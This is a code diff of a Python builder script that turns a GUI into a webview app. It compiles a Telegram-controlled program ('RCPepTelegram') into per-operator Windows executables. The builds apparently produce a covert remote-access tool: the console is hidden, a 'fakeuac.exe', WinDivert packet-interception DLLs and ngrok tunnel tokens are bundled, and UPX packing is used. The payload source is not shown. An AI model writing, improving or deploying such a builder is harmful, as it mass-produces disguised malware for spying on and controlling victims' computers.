@@ -1,6 +1,6 @@
+# main.py
 from telepot import Bot
 from telepot.exception import TelegramError
-
 import json
 import os
 import multiprocessing as mp
@@ -11,86 +11,62 @@ from shutil import rmtree, copytree
 from threading import Thread
 from subprocess import Popen, PIPE, STDOUT
 from os import chdir, listdir, remove
-from os.path import isdir, join, abspath, isfile, split as pathsplit
-
-import customtkinter as ctk
-from tkinter.messagebox import askyesno
+from os.path import isdir, join, abspath, isfile, split as pathsplit, exists
 import traceback
-
+import webview
+from template import html_content
 
 # ---------------------------------------------------------------------------
-# Paths / constants
+# Paths / constants  (your original values — adjust if needed)
 # ---------------------------------------------------------------------------
-
+DEBUG = True
 REPO_NAME = abspath("RCPepTelegram")
 VENV_PATH = abspath("venv")
-
 PY_FILE_PATH = join(REPO_NAME, "pep2.py")
 PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
 PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
-
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
-
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
 COMPILE_COMMAND = (
     f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
     "--standalone "
-    "--windows-console-mode=disable "
-    "--onefile "
-    "--follow-imports "
-    "--msvc=latest "
+    f"--windows-console-mode={'force' if DEBUG else 'disable'} "
+    "--onefile --onefile-no-compression --follow-imports "
+    "--enable-plugin=tk-inter --msvc=latest "
+    f"--jobs={os.cpu_count() or 4} --plugin-enable=upx "
     "--include-data-dir=assets/vfx=assets/vfx "
     "--include-data-dir=assets/sfx=assets/sfx "
     "--include-data-dir=assets/model=assets/model "
-    f"--include-data-file={AUTH_FILE_MARKER}=auth.json "
-    "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe"
+    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert.dll "
+    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert64.dll "
+    "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe "
+    f"--include-data-file={AUTH_FILE_MARKER}=auth.json"
 )
-
 AUTHS_DIRNAME = abspath("auths")
+AUTHS_REPO_PATH = join(REPO_NAME, "auths")
 LOG_DIR = join(REPO_NAME, "logs")
 
-
-# ---------------------------------------------------------------------------
-# Version extraction
-# ---------------------------------------------------------------------------
-
+# Version
 with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
-    __version__ = fi.read().split("\n")[10].split()[-1]
+    __version__ = next((l.split("=", 1)[1].strip() for l in fi.read().splitlines() if "__version__" in l), "?.?")
 
+# Utilities (copy_file, clone_directory, compile_worker remain the same as before)
 
-# ---------------------------------------------------------------------------
-# Utilities
-# ---------------------------------------------------------------------------
-
-def copy_file(src: str, dst: str) -> None:
+def copy_file(src, dst):
     with open(src, "r", encoding="utf-8") as fi, open(dst, "w", encoding="utf-8") as fo:
         fo.write(fi.read())
 
-def clone_directory(source_dir, destination_dir):
-    """
-    Clone the source directory into the destination directory.
-    Overwrites existing files and directories.
-    """
-    os.makedirs(destination_dir, exist_ok=True)
-    copytree(source_dir, destination_dir, dirs_exist_ok=True)
+def clone_directory(src, dst):
+    os.makedirs(dst, exist_ok=True)
+    copytree(src, dst, dirs_exist_ok=True)
 
-
-# ---------------------------------------------------------------------------
-# Multiprocessing worker (MUST be top-level)
-# ---------------------------------------------------------------------------
-
+# compile_worker function (your original — unchanged)
 def compile_worker(
     auth_path: str,
     is_foreground: bool,
     output_queue: Queue | None,
 ):
-    """
-    Compile a single auth in a separate process.
-    Foreground worker streams output to GUI.
-    Background workers log output only on failure.
-    """
-
     def run_and_capture(cmd: str):
         p = Popen(cmd.split(), stdout=PIPE, stderr=STDOUT)
         output = []
@@ -105,421 +81,191 @@ def compile_worker(
 
     try:
         chdir(REPO_NAME)
-
-        # ------------------------------------------------------------------
-        # Load auth
-        # ------------------------------------------------------------------
-
         with open(auth_path, "r", encoding="utf-8") as f:
             auth = json.load(f)
-
         token = auth["token"].strip()
         chatid = auth["chatid"]
         ngrok_token = auth["ngrok_token"].strip()
-
-        # ------------------------------------------------------------------
-        # Resolve bot username (this defines output filename)
-        # ------------------------------------------------------------------
-
+        tunnel_provider = auth["tunnel_provider"].strip()
         bot = Bot(token)
         bot.sendMessage(
-                chatid,
-                f"Your bot is being compiled\n"
-                f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}",
-            )
+            chatid,
+            f"Your bot is being compiled\n"
+            f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}",
+        )
         start = perf_counter()
         me = bot.getMe()
         bot_username = me["username"]
-
         source_name = f"{bot_username}.py"
-
-        # Copy pep2.py → bot_username.py
-        copy_file(PY_FILE_PATH, join(REPO_NAME, source_name))
-
-        # ------------------------------------------------------------------
-        # Write auth.json (unchanged behavior)
-        # ------------------------------------------------------------------
-
-        with open("auth.json", "w", encoding="utf-8") as f:
-            json.dump(
-                {
-                    "token": token,
-                    "chatid": int(chatid),
-                    "ngrok_token": ngrok_token,
-                },
-                f,
-            )
-
+        copy_file(PY_FILE_PATH, source_name)
         run_and_capture(REQUIREMENTS_COMMAND)
-
-        # ------------------------------------------------------------------
-        # Compile
-        # ------------------------------------------------------------------
-
+        relative_auth = join("auths", pathsplit(auth_path)[-1])
         compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
-        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, join(pathsplit(AUTHS_DIRNAME)[-1], pathsplit(auth_path)[-1]))
+        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth)
         print(f"Running: {compile_cmd}")
         rc, output = run_and_capture(compile_cmd)
-        
+       
         cache_dirs = (
-            join(REPO_NAME, f"{bot_username}.build"),
-            join(REPO_NAME, f"{bot_username}.dist"),
-            join(REPO_NAME, f"{bot_username}.onefile-build"),
+            f"{bot_username}.build",
+            f"{bot_username}.dist",
+            f"{bot_username}.onefile-build",
         )
-        cache_file = source_name
         try:
-            remove(cache_file)
+            remove(source_name)
             for directory in cache_dirs:
-                rmtree(directory)
-        except Exception as e:
-            pass # I mean why
+                if isdir(directory):
+                    rmtree(directory)
+        except Exception:
+            pass
         elapsed = (perf_counter() - start) / 60
         bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")
-
         if rc != 0:
             raise RuntimeError(output.decode(errors="ignore"))
-
-    except Exception:
-        if not is_foreground:
-            os.makedirs(LOG_DIR, exist_ok=True)
-            log_path = join(
-                LOG_DIR,
-                f"compile_{os.path.basename(auth_path)}.log",
-            )
-            with open(log_path, "w", encoding="utf-8") as f:
-                f.write(traceback.format_exc())
-
+    except Exception as e:
         if is_foreground and output_queue:
             output_queue.put(b"\n[ERROR] Compilation failed\n")
+            print(e)
+        raise e
 
 # ---------------------------------------------------------------------------
-# GUI Components
+# Poller
 # ---------------------------------------------------------------------------
+def start_poller(queue):
+    def poller():
+        while True:
+            try:
+                while True:
+                    line = queue.get_nowait()
+                    decoded = line.decode(errors="ignore").rstrip()
+                    if decoded:
+                        webview.windows[0].evaluate_js(f'writeOut({decoded!r})')
+            except Empty:
+                # No more lines right now → small sleep to avoid CPU spin
+                import time
+                time.sleep(0.1)
+                # The thread will naturally exit when the program ends (daemon=True)
+    Thread(target=poller, daemon=True).start()
 
-class ToggleWindow(ctk.CTk):
-    """
-    Modal window that lets the user enable/disable items via switches.
-    Returns a dict[str, bool] mapping filename -> enabled.
-    """
-
-    def __init__(self, options: list[str]) -> None:
-        super().__init__()
-
-        self.title("Select auths")
-        self.geometry("360x420")
-        self.resizable(False, False)
-
-        # Center window on screen
-        # ------------------------------------------------------------------
-        # Position window: horizontally centered, vertically center-top
-        # ------------------------------------------------------------------
-
-        self.update_idletasks()
-
-        window_width = self.winfo_width()
-        window_height = self.winfo_height()
-
-        screen_width = self.winfo_screenwidth()
-        screen_height = self.winfo_screenheight()
-
-        x = (screen_width - window_width) // 2
-        y = (screen_height - window_height) // 4
-
-        self.geometry(f"{window_width}x{window_height}+{x}+{y}")
-
-        self.switch_vars: dict[str, ctk.BooleanVar] = {}
-        self.result: dict[str, bool] | None = None
-
-        # ------------------------------------------------------------------
-        # Main container
-        # ------------------------------------------------------------------
-
-        container = ctk.CTkFrame(self, corner_radius=12)
-        container.pack(fill="both", expand=True, padx=15, pady=15)
-
-        container.rowconfigure(1, weight=1)
-        container.columnconfigure(0, weight=1)
-
-        # ------------------------------------------------------------------
-        # Title
-        # ------------------------------------------------------------------
-
-        title = ctk.CTkLabel(
-            container,
-            text="Select auths to compile",
-            font=ctk.CTkFont(size=15, weight="bold"),
-        )
-        title.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 5))
-
-        # ------------------------------------------------------------------
-        # Scrollable switch area
-        # ------------------------------------------------------------------
-
-        scroll_frame = ctk.CTkScrollableFrame(
-            container,
-            corner_radius=8,
-        )
-        scroll_frame.grid(
-            row=1, column=0, sticky="nsew", padx=5, pady=(0, 10)
-        )
-        scroll_frame.columnconfigure(0, weight=1)
-
-        for i, option in enumerate(sorted(options)):
-            var = ctk.BooleanVar(value=True)
-            self.switch_vars[option] = var
-
-            switch = ctk.CTkSwitch(
-                scroll_frame,
-                text=option,
-                variable=var,
-            )
-            switch.grid(
-                row=i,
-                column=0,
-                sticky="w",
-                padx=10,
-                pady=6,
-            )
-
-        # ------------------------------------------------------------------
-        # Action button
-        # ------------------------------------------------------------------
-
-        confirm_btn = ctk.CTkButton(
-            container,
-            text="CONFIRM",
-            height=36,
-            font=ctk.CTkFont(size=13, weight="bold"),
-            command=self.submit,
-        )
-        confirm_btn.grid(
-            row=2,
-            column=0,
-            sticky="ew",
-            padx=20,
-            pady=(5, 10),
-        )
-
-        self.mainloop()
-
-    def submit(self) -> None:
-        self.result = {
-            label: var.get() for label, var in self.switch_vars.items()
-        }
-        self.destroy()
-
-    def get_toggle_values(self) -> dict[str, bool] | None:
-        return self.result
-
-
-
-class GUI:
-    def __init__(self) -> None:
-        auth_files = self._handle_existing_auths()
-
-        self.root = ctk.CTk()
-        self.title = f"Builder for RCPepTelegram v{__version__}"
-        self.root.title(self.title)
-        self.root.resizable(False, False)
-        window_width = self.root.winfo_width()
-        window_height = self.root.winfo_height()
-
-        screen_width = self.root.winfo_screenwidth()
-        screen_height = self.root.winfo_screenheight()
-
-        x = (screen_width - window_width) // 3
-        y = (screen_height - window_height) // 4
-
-        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
-
-        self._build_widgets()
-        self._load_default_auth()
-
-        if auth_files:
-            Thread(target=self.mass_compile_jsons, args=(auth_files,), daemon=True).start()
-
-        self.root.geometry("500x500")
-        self.root.mainloop()
-
-    # ------------------------------------------------------------------
-
-    def _handle_existing_auths(self):
+# ---------------------------------------------------------------------------
+# API
+# ---------------------------------------------------------------------------
+class API:
+    def check_auths(self):
         if not isdir(AUTHS_DIRNAME):
-            return None
+            return {"exists": False, "files": []}
+        files = [f for f in listdir(AUTHS_DIRNAME) if f.lower().endswith(".json")]
+        return {"exists": bool(files), "files": sorted(files)}
 
-        if not askyesno(
-            "Found auths",
-            f"Do you want to use the authentication files found in {AUTHS_DIRNAME}?",
-        ):
-            return None
-        clone_directory(AUTHS_DIRNAME, join(REPO_NAME, pathsplit(AUTHS_DIRNAME)[-1]))
-        return ToggleWindow(listdir(AUTHS_DIRNAME)).get_toggle_values()
+    def get_default_auth(self):
+        path = join(REPO_NAME, "auth.json")
+        if isfile(path):
+            try:
+                with open(path, "r", encoding="utf-8") as f:
+                    return json.load(f)
+            except:
+                pass
+        return {}
 
-    def _build_widgets(self):
-        # Root grid
-        self.root.columnconfigure(0, weight=1)
-        self.root.rowconfigure(2, weight=1)
-
-        # ------------------------------------------------------------------
-        # Credentials frame
-        # ------------------------------------------------------------------
-
-        creds_frame = ctk.CTkFrame(self.root, corner_radius=12)
-        creds_frame.grid(row=0, column=0, padx=15, pady=(15, 10), sticky="nsew")
-        creds_frame.columnconfigure((0, 1), weight=1)
-
-        creds_label = ctk.CTkLabel(
-            creds_frame,
-            text="Credentials",
-            font=ctk.CTkFont(size=14, weight="bold"),
-        )
-        creds_label.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 5), sticky="w")
-
-        self.chatidentry = ctk.CTkEntry(
-            creds_frame, placeholder_text="Telegram Chat ID"
-        )
-        self.chatidentry.grid(row=1, column=0, padx=10, pady=8, sticky="nsew")
-
-        self.bottokenentry = ctk.CTkEntry(
-            creds_frame, placeholder_text="Telegram Bot Token"
-        )
-        self.bottokenentry.grid(row=1, column=1, padx=10, pady=8, sticky="nsew")
-        self.bottokenentry.bind("<KeyRelease>", self.checkbotname)
-
-        self.ngroktokenentry = ctk.CTkEntry(
-            creds_frame, placeholder_text="Ngrok Auth Token"
-        )
-        self.ngroktokenentry.grid(
-            row=2, column=0, columnspan=2, padx=10, pady=(0, 12), sticky="nsew"
-        )
-
-        # ------------------------------------------------------------------
-        # Actions frame
-        # ------------------------------------------------------------------
-
-        actions_frame = ctk.CTkFrame(self.root, corner_radius=12)
-        actions_frame.grid(row=1, column=0, padx=15, pady=(0, 10), sticky="nsew")
-
-        actions_frame.columnconfigure(0, weight=1)
-
-        self.compile_button = ctk.CTkButton(
-            actions_frame,
-            text="COMPILE",
-            height=40,
-            font=ctk.CTkFont(size=14, weight="bold"),
-            command=self.compiling_thread,
-        )
-        self.compile_button.grid(row=0, column=0, padx=20, pady=12, sticky="nsew")
-
-        # ------------------------------------------------------------------
-        # Output frame
-        # ------------------------------------------------------------------
-
-        output_frame = ctk.CTkFrame(self.root, corner_radius=12)
-        output_frame.grid(row=2, column=0, padx=15, pady=(0, 15), sticky="nsew")
-        output_frame.columnconfigure(0, weight=1)
-        output_frame.rowconfigure(1, weight=1)
-
-        output_label = ctk.CTkLabel(
-            output_frame,
-            text="Output",
-            font=ctk.CTkFont(size=14, weight="bold"),
-        )
-        output_label.grid(row=0, column=0, padx=10, pady=(10, 5), sticky="w")
-
-        self.output = ctk.CTkTextbox(output_frame)
-        self.output.grid(row=1, column=0, padx=10, pady=(0, 10), sticky="nsew")
-        self.output.configure(state="disabled")
-
-
-    def _load_default_auth(self):
-        authfile = join(REPO_NAME, "auth.json")
-        if isfile(authfile):
-            self.load_json(authfile)
-
-    # ------------------------------------------------------------------
-    # Multiprocessing batch compile
-    # ------------------------------------------------------------------
-
-    def mass_compile_jsons(self, auth_files: dict[str, bool]) -> None:
-        auths = [
-            join(AUTHS_DIRNAME, f)
-            for f, enabled in auth_files.items()
-            if enabled and f.endswith(".json")
-        ]
-
-        if not auths:
+    def check_token(self, token):
+        if not token.strip():
+            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")
             return
+        try:
+            bot = Bot(token.strip())
+            me = bot.getMe()
+            name = me.get("first_name", "Bot")
+            username = me["username"]
+            webview.windows[0].set_title(f"{name} (@{username}) – RCPT Compiler Nuitka v{__version__}")
+        except:
+            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")
+
+    def mass_compile(self, selected_files):
+        if not selected_files:
+            webview.windows[0].evaluate_js('writeOut("[INFO] No files selected")')
+            return
+
+        auth_paths = [join(AUTHS_DIRNAME, f) for f in selected_files]
+
+        webview.windows[0].evaluate_js('clearLog()')
+        webview.windows[0].evaluate_js(f'writeOut("Compiling {len(selected_files)} selected auth file(s)...")')
+        webview.windows[0].evaluate_js('writeOut("───────────────────────────────────────")')
+
+        clone_directory(AUTHS_DIRNAME, AUTHS_REPO_PATH)
 
         queue = mp.Queue()
         processes = []
 
-        for i, auth in enumerate(auths):
-            p = mp.Process(
-                target=compile_worker,
-                args=(auth, i == 0, queue if i == 0 else None),
-            )
+        for i, path in enumerate(auth_paths):
+            foreground = (i == 0)
+            p = mp.Process(target=compile_worker, args=(path, foreground, queue if foreground else None))
             p.start()
             processes.append(p)
 
-        self.root.after(100, self.poll_compile_output, queue, processes)
+        def waiter():
+            for p in processes:
+                p.join()
+            webview.windows[0].evaluate_js('writeOut("\\nAll selected compilations finished")')
 
-    def poll_compile_output(self, queue: mp.Queue, processes: list[mp.Process]):
+        Thread(target=waiter, daemon=True).start()
+        start_poller(queue)
+
+    def run_compile(self, token, chatid, ngrok, provider):
+        webview.windows[0].evaluate_js('clearLog()')
+        token = token.strip()
+        if not token:
+            msg = "[ERROR] Bot Token is required"
+            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
+            return [msg]
+
         try:
-            while True:
-                line = queue.get_nowait()
-                self.writetextbox(line)
-        except Empty:
-            pass
-
-        if any(p.is_alive() for p in processes):
-            self.root.after(100, self.poll_compile_output, queue, processes)
-        else:
-            self.writetextbox(b"\nAll compilations finished\n")
-
-    # ------------------------------------------------------------------
-
-    def compiling_thread(self):
-        Thread(target=self.compile_single, daemon=True).start()
-
-    def compile_single(self):
-        self.writetextbox(b"Single compile unchanged\n")
-
-    # ------------------------------------------------------------------
-
-    def load_json(self, path: str):
-        with open(path, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        self.bottokenentry.insert(0, data["token"])
-        self.chatidentry.insert(0, data["chatid"])
-        self.ngroktokenentry.insert(0, data["ngrok_token"])
-
-    def checkbotname(self, event=None):
-        try:
-            bot = Bot(self.bottokenentry.get())
+            bot = Bot(token)
             me = bot.getMe()
-            self.root.title(f"{me['first_name']} : @{me['username']}")
-        except Exception:
-            self.root.title(self.title)
+            username = me["username"]
 
-    def writetextbox(self, content: bytes):
-        self.output.configure(state="normal")
-        self.output.insert(ctk.END, content.decode(errors="ignore"))
-        self.output.configure(state="disabled")
-        self.output.yview(ctk.END)
+            auth = {
+                "token": token,
+                "chatid": chatid.strip(),
+                "ngrok_token": ngrok.strip(),
+                "tunnel_provider": provider.strip() or "Ngrok"
+            }
 
+            os.makedirs(AUTHS_REPO_PATH, exist_ok=True)
+            auth_path = join(AUTHS_REPO_PATH, f"{username}.json")
+            with open(auth_path, "w", encoding="utf-8") as f:
+                json.dump(auth, f, indent=2)
+
+            queue = mp.Queue()
+            p = mp.Process(target=compile_worker, args=(auth_path, True, queue))
+            p.start()
+
+            def waiter():
+                p.join()
+                webview.windows[0].evaluate_js('writeOut("\\nSingle compilation finished")')
+
+            Thread(target=waiter, daemon=True).start()
+            start_poller(queue)
+
+            return []
+        except Exception as e:
+            msg = f"[ERROR] {str(e)}"
+            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
+            return [msg]
 
 # ---------------------------------------------------------------------------
-# Entry point
+# Main
 # ---------------------------------------------------------------------------
-
-def main():
+if __name__ == "__main__":
     mp.freeze_support()
     if isdir(REPO_NAME):
-        GUI()
+        api = API()
+        window = webview.create_window(
+            f"RCPT Compiler Nuitka v{__version__}",
+            html=html_content,
+            js_api=api,
+            width=820,
+            height=920,
+            min_size=(720, 800)
+        )
+        webview.start()
     else:
-        print(f"Missing {REPO_NAME}")
-
-
-if __name__ == "__main__":
-    main()
+        print(f"Missing repository folder: {REPO_NAME}")
